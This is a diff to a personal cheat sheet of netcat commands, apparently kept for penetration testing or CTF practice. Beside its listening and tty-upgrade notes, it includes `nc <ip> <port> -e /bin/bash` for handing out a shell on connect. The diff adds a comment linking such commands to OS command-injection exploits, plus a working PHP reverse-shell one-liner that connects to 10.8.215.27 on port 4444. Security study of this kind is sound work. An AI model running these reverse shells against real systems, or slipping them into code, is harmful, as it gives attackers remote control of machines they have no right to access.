@@ -1,6 +1,7 @@
 # All of my used comamnds in netcat
 
 - `echo hello | nc <ip> <port>` send the output of echo by tcp packets to the specified ip and port
+  - This type of commands are used in exploiting os command execution
 - `nc <ip> <port> -e /bin/bash` specify which program to execute after connect to a host
 - `nc -l -p <port>` Listen for incoming packets from the specified port
 - `nc -l -n -p <port>` Do not do any DNS or service lookups on any specified addresses, hostnames or
@@ -19,3 +20,5 @@ stty raw -echo
 # type fg to regain the netcat shell and press some enters
 export TERM=xterm
 ```
+
+`php -r '$sock=fsockopen("10.8.215.27",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`
